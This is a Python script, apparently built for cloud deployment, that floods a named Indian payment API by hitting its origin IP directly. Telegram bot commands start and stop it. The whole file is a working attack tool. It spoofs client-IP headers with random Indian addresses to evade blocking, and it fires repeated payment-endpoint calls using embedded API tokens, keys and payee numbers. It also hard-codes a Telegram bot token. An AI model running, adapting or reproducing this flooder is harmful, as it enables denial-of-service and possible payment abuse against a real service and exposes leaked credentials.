#!/usr/bin/env python3
"""
🔥 INDIAN IP FLOODER – Railway Deploy Ready with Telegram Bot Control
"""
import asyncio
import aiohttp
import random
import string
import time
import sys
import os
import ipaddress
import logging
from aiohttp import web

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo"
ADMIN_ID = 8401097557

# ─── INDIAN IP RANGES ────────────────────────────────────
INDIAN_RANGES = [
    ("1.10.10.0", "1.10.10.255"),
    ("1.178.23.0", "1.178.23.255"),
    ("1.178.88.0", "1.178.88.255"),
    ("1.186.254.0", "1.186.254.255"),
    ("1.187.0.0", "1.187.255.255"),
    ("1.22.0.0", "1.23.255.255"),
    ("1.38.0.0", "1.39.255.255"),
    ("1.6.0.0", "1.7.255.255"),
    ("101.0.32.0", "101.0.63.255"),
    ("101.2.0.0", "101.2.127.255"),
    ("101.2.195.0", "101.2.195.255"),
    ("101.2.197.0", "101.2.198.255"),
    ("101.2.207.0", "101.2.208.255"),
    ("101.2.215.0", "101.2.215.255"),
    ("101.2.220.0", "101.2.221.255"),
    ("101.2.240.0", "101.2.240.255"),
    ("101.2.244.0", "101.2.245.255"),
    ("101.2.248.0", "101.2.249.255"),
    ("101.2.252.0", "101.2.255.255"),
    ("101.208.0.0", "101.223.255.255"),
    ("101.32.228.0", "101.32.237.255"),
    ("101.32.80.0", "101.32.95.255"),
    ("101.33.16.0", "101.33.16.255"),
    ("101.33.2.0", "101.33.3.255"),
    ("101.33.60.0", "101.33.63.255"),
    ("101.53.128.0", "101.53.159.255"),
    ("103.1.100.0", "103.1.103.255"),
    ("103.1.112.0", "103.1.115.255"),
    ("103.1.124.0", "103.1.131.255"),
    ("103.1.196.0", "103.1.196.255"),
    ("103.1.198.0", "103.1.198.255"),
    ("103.1.48.0", "103.1.49.255"),
    ("103.1.6.0", "103.1.6.255"),
    ("103.1.80.0", "103.1.83.255"),
    ("103.10.109.0", "103.10.109.255"),
    ("103.10.116.0", "103.10.119.255"),
    ("103.10.132.0", "103.10.135.255"),
]

INDIAN_NETWORKS = []
for start, end in INDIAN_RANGES:
    start_ip = int(ipaddress.IPv4Address(start))
    end_ip = int(ipaddress.IPv4Address(end))
    INDIAN_NETWORKS.append((start_ip, end_ip))

def random_indian_ip():
    start_ip, end_ip = random.choice(INDIAN_NETWORKS)
    rand_int = random.randint(start_ip, end_ip)
    return str(ipaddress.IPv4Address(rand_int))

# ─── ORIGIN IP ──────────────────────────────────────────
ORIGIN_IP = "148.113.13.242"
TARGET_DOMAIN = "ultra-pay.in"
SCHEME = "https"
TARGET_URL = f"{SCHEME}://{ORIGIN_IP}/APIs/api"

TOKENS = [
    {"token": "IKJ6bCOnVVkb1N5K5dIHOS00T7HwxGECTdR9d6ml", "key": "fMdb6XOjYp6U0JDj9pSl", "payto": "1730611550"},
    {"token": "cUcM3sX925Z0vEqJ5Er80HNd7mpDQLHWJrlZ5Y5Ln", "key": "e7oIeqLCd4N32M2A", "payto": "9234383141"},
]

CONCURRENT = 20
TOTAL_REQUESTS = 0
TIMEOUT = 10

# ─── SHARED STATE ──────────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0}
lock = asyncio.Lock()
running = False
start_time = 0
flooder_task = None

# ─── HEADERS ──────────────────────────────────────────────
def get_headers(spoof_ip):
    return {
        "Host": TARGET_DOMAIN,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "CF-Connecting-IP": spoof_ip,
    }

# ─── WORKER ──────────────────────────────────────────────
async def fire(session, sem, url, req_id):
    async with sem:
        spoof_ip = random_indian_ip()
        headers = get_headers(spoof_ip)
        try:
            async with session.get(url, headers=headers, ssl=False, timeout=TIMEOUT) as resp:
                status = resp.status
                async with lock:
                    stats['sent'] += 1
                    if 200 <= status < 400:
                        stats['ok'] += 1
                    else:
                        stats['fail'] += 1
                if req_id % 10 == 0:
                    result = "✅ OK" if status == 200 else f"❌ {status}"
                    logger.info(f"Req #{req_id} [{spoof_ip}] → {result}")
        except asyncio.TimeoutError:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1
            logger.info(f"Req #{req_id} [{spoof_ip}] → ⏱️ TIMEOUT")
        except Exception:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1
            logger.info(f"Req #{req_id} [{spoof_ip}] → ❌ ERROR")

# ─── FLOODER LOOP ──────────────────────────────────────────
async def flooder_loop():
    global running, start_time
    logger.info("🔥 Flooder started")
    running = True
    start_time = time.time()
    
    sem = asyncio.Semaphore(CONCURRENT)
    connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        count = 0
        while running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
            to_add = CONCURRENT - len(tasks)
            for _ in range(to_add):
                if not running:
                    break
                token = random.choice(TOKENS)
                comment = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                url = f"{TARGET_URL}?token={token['token']}&key={token['key']}&paytoNumber={token['payto']}&amount=1&comment={comment}"
                count += 1
                task = asyncio.create_task(fire(session, sem, url, count))
                tasks.add(task)
                await asyncio.sleep(0.001)
            
            if len(tasks) > CONCURRENT * 2:
                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                tasks = set(tasks)
            
            if count % 50 == 0:
                elapsed = time.time() - start_time
                async with lock:
                    s = stats['sent']
                    o = stats['ok']
                    f = stats['fail']
                rate = s / elapsed if elapsed > 0 else 0
                logger.info(f"Sent: {s:,} | OK: {o:,} | Fail: {f:,} | Rate: {rate:.1f} req/s")
        
        if tasks:
            await asyncio.wait(tasks, timeout=10)
    logger.info("Flooder stopped")

# ─── TELEGRAM COMMANDS ──────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "🔥 **Indian IP Flooder Bot**\n"
        "/status – Live stats\n"
        "/startflood – Start flooding\n"
        "/stopflood – Stop flooding"
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time if start_time else 0
    async with lock:
        s = stats['sent']
        o = stats['ok']
        f = stats['fail']
    rate = s / elapsed if elapsed > 0 else 0
    ok_pct = (o / s * 100) if s > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {s:,}\n"
           f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
           f"❌ Errors: {f:,}\n"
           f"⚡ Rate: {rate:.1f} req/s\n"
           f"🔄 Running: {'✅ Yes' if running else '❌ No'}")
    await update.message.reply_text(msg)

async def start_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running, flooder_task, stats, start_time
    if update.effective_user.id != ADMIN_ID:
        return
    if running:
        await update.message.reply_text("⚠️ Already running.")
        return
    running = True
    start_time = time.time()
    async with lock:
        stats = {'sent': 0, 'ok': 0, 'fail': 0}
    flooder_task = asyncio.create_task(flooder_loop())
    await update.message.reply_text("▶️ Flooder started.")

async def stop_flooder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_user.id != ADMIN_ID:
        return
    if not running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    running = False
    if flooder_task:
        flooder_task.cancel()
    await update.message.reply_text("🛑 Flooder stopped.")

# ─── HEALTH CHECK ──────────────────────────────────────────
async def health(request):
    return web.Response(text="✅ Flooder is online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    logger.info("🌐 Web server started on port %s", port)
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("startflood", start_flooder_cmd))
    app.add_handler(CommandHandler("stopflood", stop_flooder_cmd))
    
    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Indian IP Flooder Bot is online.**\n/start for commands.")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()
        )
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
